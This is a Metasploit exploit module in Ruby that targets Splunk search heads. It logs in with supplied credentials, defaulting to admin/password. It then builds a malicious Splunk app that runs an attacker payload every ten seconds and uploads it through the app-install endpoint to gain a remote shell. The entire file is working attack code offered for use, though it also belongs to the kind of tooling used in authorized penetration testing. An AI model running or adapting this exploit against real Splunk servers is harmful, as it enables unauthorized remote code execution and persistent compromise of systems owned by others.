##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'zlib'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Splunk Searchhead Remote Code Execution',
      'Description' => %q{
    This module uses valid credentials to gain a remote shell on Splunk search heads.

    This module abuses administrative functionality in Splunk
    in order to upload a malicious Splunk 'app' with the desired
    payload.
      },
      'Author' =>
        [
          'VolatileMinds'
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['python'],
      'Arch'       => ARCH_PYTHON,
      'Payload'    =>
        {
          #'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('USERNAME', [ true, 'The username to authenticate with', 'admin']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password'])
      ], self.class)
  end

  def exploit

    cval = Rex::Text.rand_text_alpha(5)
    payload_name = Rex::Text.rand_text_alpha(5)

    #login
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/en-US/account/login',
      'vars_post' => {
        'cval' => cval,
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      },
      'cookie' => "cval=#{cval}"
    })

    unless res && res.code == 200
      fail_with(Failure::Unknown, "Authentication failed.")
    end

    cookie = res.get_cookies

    tar = StringIO.new('')
    tar.set_encoding('ASCII-8BIT')
    Gem::Package::TarWriter.new(tar) do |writer|
      writer.add_file("#{payload_name}/bin/#{payload_name}.py", 0644) do |file|
        file.write(payload.encoded)
      end

      writer.add_file("#{payload_name}/default/inputs.conf", 0644) do |file|
        file.write(
%Q{[script://./bin/#{payload_name}.py]
disabled = 0
interval = 10
sourcetype = pentest}
        )
      end
    end

    payload_file = nil
    gz = StringIO.new('')
    gz.set_encoding('ASCII-8BIT')
    z = Zlib::GzipWriter.new(gz)

    z.write tar.string
    z.close

    payload_file = gz.string
    payload_file.force_encoding('ASCII-8BIT')

    File.write('/tmp/'+payload_name+'.tar.gz', payload_file)

    res = send_request_cgi({
      'uri' => '/en-US/manager/appinstall/_upload',
      'cookie' => cookie
    })

    cookie = cookie << ";" << res.get_cookies
    state = $1 if res && res.body =~ /<input type="hidden" name="state" value="(.*?)">/
    form_key = $1 if res && res.body =~ /<input type="hidden" name="splunk_form_key" value="(.*?)" \/>/

    data = Rex::MIME::Message.new

    data.add_part(state, nil, nil, 'form-data; name="state"')
    data.add_part(form_key, nil, nil, 'form-data; name="splunk_form_key"')
    #data.add_part(payload_file, 'application/x-gzip', nil, "form-data; name=\"appfile\"; filename=\"#{payload_name}.tar.gz\"")
    data.add_part('1', nil, nil, 'form-data; name="force"')

    test_data = data.to_s[0..-5] +
      %Q{\r\nContent-Disposition: form-data; name="appfile"; filename="#{payload_name}.tar.gz"
Content-Type: application/x-gzip

#{payload_file}
--#{data.bound}--\r\n\r\n}

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/en-US/manager/appinstall/_upload',
      'cookie' => cookie,
      'ctype' => "multipart/form-data;charset=UTF-8;boundary=#{data.bound}",
      'headers' => {
        'Referer' => "http#{datastore['SSL'] ? 's' : ''}://#{datastore['RHOST']}:#{datastore['RPORT']}/en-US/manager/appinstall/_upload"
      },
      'data' => test_data
    })
  end
end
